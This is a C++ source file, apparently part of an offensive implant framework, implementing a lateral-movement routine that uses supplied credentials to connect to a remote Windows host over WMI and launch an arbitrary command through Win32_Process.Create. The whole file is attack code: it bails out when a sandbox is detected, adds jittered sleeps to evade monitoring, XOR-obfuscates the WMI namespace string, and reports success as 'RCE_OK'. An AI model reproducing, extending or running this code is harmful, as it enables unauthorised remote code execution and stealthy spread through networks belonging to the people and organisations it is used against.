#include "WmiExec.h"
#include "../recon/WmiHelpers.h"
#include "../evasion/AntiSandbox.h"
#include "../utils/Obfuscator.h"
#include <thread>
#include <chrono>
#include <cstdio>
#include <cstdlib>

namespace lateral {

std::string WmiExec(const std::string& target, const std::string& user, const std::string& pass, const std::string& cmd) {
    if (evasion::IsLikelySandbox()) {
        return "ERROR: Sandbox detected";
    }

    // Jitter sleep
    int jitter = (rand() % 500) + 100;
    std::this_thread::sleep_for(std::chrono::milliseconds(jitter));

    try {
        // Create a WmiSession. It will initially connect to local CIMV2,
        // but we immediately redirect it with ConnectRemote.
        recon::WmiSession wmi;

        std::wstring wtarget(target.begin(), target.end());
        std::wstring wuser(user.begin(), user.end());
        std::wstring wpass(pass.begin(), pass.end());
        std::wstring wcmd(cmd.begin(), cmd.end());

        // Parse domain if present in user (e.g. DOMAIN\user)
        std::wstring domain = L"";
        std::wstring username = wuser;
        size_t backslash = wuser.find(L'\\');
        if (backslash != std::wstring::npos) {
            domain = wuser.substr(0, backslash);
            username = wuser.substr(backslash + 1);
        }

        // "ROOT\CIMV2" obfuscated
        std::wstring ns = utils::xor_wstr(L"\x08\x15\x15\x0e\x06\x19\x13\x17\x0c\x68", 10);
        if (!wmi.ConnectRemote(wtarget, username, domain, wpass, ns)) {
            return "ERROR: ConnectRemote failed";
        }

        unsigned long retVal = 0;
        HRESULT hr = wmi.ExecProcessCreate(wcmd, &retVal);

        if (FAILED(hr)) {
            char buf[32];
            std::snprintf(buf, sizeof(buf), "0x%08X", (unsigned int)hr);
            return std::string("ERROR: ExecMethod failed: ") + buf;
        }

        if (retVal == 0) {
            return "RCE_OK";
        } else {
            return "ERROR: Win32_Process.Create returned " + std::to_string(retVal);
        }
    } catch (const std::exception& e) {
        return std::string("ERROR: Exception: ") + e.what();
    }
}

} // namespace lateral
